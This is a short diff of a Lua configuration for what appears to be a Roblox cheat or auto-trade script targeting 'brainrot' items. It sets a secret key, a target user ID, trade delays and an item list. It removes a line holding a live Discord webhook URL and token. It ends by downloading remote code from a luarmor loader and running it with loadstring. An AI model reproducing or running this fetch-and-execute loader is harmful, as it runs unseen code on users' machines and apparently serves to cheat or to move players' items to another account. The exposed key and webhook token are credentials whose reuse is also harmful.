@@ -2,7 +2,6 @@ getgenv().SECRET_KEY = "mrr_c21b3404dc044cf19fcddd53da4b338e"
 getgenv().TARGET_ID = 10310934536
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485261833182118041/CO2DUupkBm50nlVEIh0VM_YEQT0o54hPv0BrufWosk1mHj3MEfyhyL2GHgDbMjWOdGiR"
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -106,6 +105,6 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Amigos"] = true,
     ["Los Combinasionas"] = true,
     ["Lovin Rose"] = true,
-    ["Rhino Toasterino"] = true
+    ["Fluriflura"] = true
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
